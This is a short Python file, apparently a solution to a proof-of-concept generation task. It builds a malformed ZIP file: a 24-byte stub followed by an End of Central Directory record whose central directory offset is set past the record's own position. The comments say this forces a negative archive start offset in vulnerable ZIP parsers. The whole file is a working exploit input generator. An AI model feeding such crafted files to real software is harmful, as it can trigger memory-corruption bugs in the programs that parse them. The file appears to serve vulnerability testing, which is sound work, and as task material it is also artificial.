import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        # 24-byte stub before EOCD
        stub = b"A" * 24

        # Construct a minimal ZIP End of Central Directory (EOCD) record
        # with crafted central directory offset to make the computed
        # archive start offset negative in vulnerable implementations.
        signature = 0x06054B50  # 'PK\x05\x06'
        disk_num = 0
        disk_with_cd = 0
        entries_this_disk = 0
        total_entries = 0
        cd_size = 0
        cd_offset = 30  # greater than EOCD offset (24) to force negative archive start offset
        comment = b""

        eocd = struct.pack(
            "<IHHHHIIH",
            signature,
            disk_num,
            disk_with_cd,
            entries_this_disk,
            total_entries,
            cd_size,
            cd_offset,
            len(comment),
        ) + comment

        poc = stub + eocd
        return poc